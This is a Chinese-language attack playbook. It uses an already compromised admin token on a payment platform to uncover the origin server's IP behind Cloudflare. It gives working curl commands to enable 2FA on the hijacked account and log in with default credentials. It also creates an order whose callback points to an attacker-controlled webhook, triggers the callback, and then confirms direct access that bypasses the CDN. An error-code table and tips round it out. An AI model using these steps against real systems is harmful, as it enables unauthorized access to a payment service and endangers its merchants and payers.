# ShopInformUrl 回调抓源站出站 IP（已验证）

当 Host/CIDR/证书 SAN 全 0、判定源站只放行 CF 回源时，**不要再扩扫**。用已沦陷的管理 JWT 让服务器主动回调 → 回调源 IP = 源站出站 IP。

## 前置

- 管理号 JWT（`UserTypeId=4`，无 2FA 或能自开 2FA）
- 至少一个商户 `LongId`（`UserTypeId=2`，来自 `searchSimpleUsers`）
- 可控接收器：`POST https://webhook.site/token` → uuid；读 `/token/<uuid>/requests`

## 端到端剧本

```bash
# 0) 接收器
UUID=$(curl -sk -X POST https://webhook.site/token | jq -r .uuid)
WH=https://webhook.site/$UUID

# 1) 自开 2FA（未开时）
curl -sk -H "Authorization: Bearer $TOK" https://HOST/api/getTwoFactorAuthData
# → {"Secret":"KX4Q...","QrCode":"otpauth://..."}
# 本地 TOTP(Secret) → CODE
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"Secret":"KX4Q...","Code":"CODE"}' https://HOST/api/enableTwoFactorAuth
# → "success"

# 2) 刷新 JWT（启用 2FA 后旧 token → LoginAgain）
curl -sk -H 'Content-Type: application/json' \
  -d '{"userName":"adminmiya","password":"adminmiya","TwoFactorAuthCode":"CODE"}' \
  https://HOST/api/login

# 3) 商户 HashKey（商户 API 签名用，可选）
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"shopUserId":7,"TwoFactorAuthCode":"CODE"}' \
  https://HOST/api/generateNewHashKey
# → "unUontHSiNAtPKUKgNCtK2rO75BKILMZ"

# 4) 建单（ShopInformUrl = 接收器）
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{
    "CurrencyId":11,"Amount":100,
    "PayerKey":"pk_xxx","PayerName":"OriginTrace",
    "PayerAccountNumber":"01712345678",
    "PaymentChannelId":34,
    "ShopReturnUrl":"'$WH'","ShopOrderId":"ORD-xxx",
    "ShopRemark":"origin-ip-trace","ShopInformUrl":"'$WH'",
    "ShopUserLongId":"<商户LongId>",
    "TwoFactorAuthCode":"CODE"
  }' https://HOST/api/createOrder
# → {"Success":true,"TrackingNumber":"...","PayUrl":"..."}

# 5) 触发回调
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"TrackingNumbers":["<tn>"]}' https://HOST/api/informOrders
# → "success"

# 6) 读出站 IP
curl -sk "https://webhook.site/token/$UUID/requests?sorting=newest&per_page=5"
# → data[].ip = 源站出站 IP（UA=Go-http-client/2.0）
```

## 强制验证（Host 200 ≠ 源站）

```bash
IP=<出站IP>
curl -sk --resolve HOST:443:$IP https://HOST/api/getSetting
# 必须含 "PlatformName":"GBKPay"，且无 CF-RAY

echo | openssl s_client -connect $IP:443 -servername HOST 2>/dev/null \
  | openssl x509 -noout -subject -ext subjectAltName
# CN/SAN 必须 = 目标 Host

# 直连登录也应通（绕过 CF）
curl -sk --resolve HOST:443:$IP -H 'Content-Type: application/json' \
  -d '{"userName":"admin4","password":"admin4"}' https://HOST/api/login
```

开放端口常含 **22 / 80 / 443**。

## 错误语义速查

| 返回 | 含义 | 动作 |
|---|---|---|
| `TwoFactorAuthNotEnabled` | 管理号未开 2FA | 先走 enableTwoFactorAuth |
| `NoPayerKey` / `NoPaymentChannelId` | 字段不齐 | 补齐，**不等于** LongId 无效 |
| `CheckEncryptValueFailed` | 签名/2FA 校验失败 | 刷新 token + 带正确 TOTP |
| `LoginAgain` | token 失效（常因刚开 2FA） | 重登 |
| `NoOrder` | informOrders 单号不存在 | 用刚建的 TrackingNumber |
| `getShopApiSetting` → `null` | 管理 JWT 看不到商户设置 | 用 generateNewHashKey |

## 坑

- **商户白名单 IP ≠ 源站**：`searchFullUserWhiteIpAddresses` 是商户 API 出口，逐个 Host 指纹几乎全 0，别当候选源站扫。
- **`admin/getProxySetting` / `updateProxySetting`（含 `TestProxyUrl`）在租户面 404**，只在独立管理端子域（如 `9m9mm.<root>`）存在；管理号锁死时别死等这条，优先走本剧本。
- `createOrder` 成功后回调**不会自动发**；必须 `informOrders` 手动触发（或等真实支付完成）。
- webhook.site 免费 token 有速率限制；内网/自建接收器更稳。
- 通道枚举：bKash=34 / Nagad=35 / Rocket=46 / GCash=14；CurrencyId BDT=11。
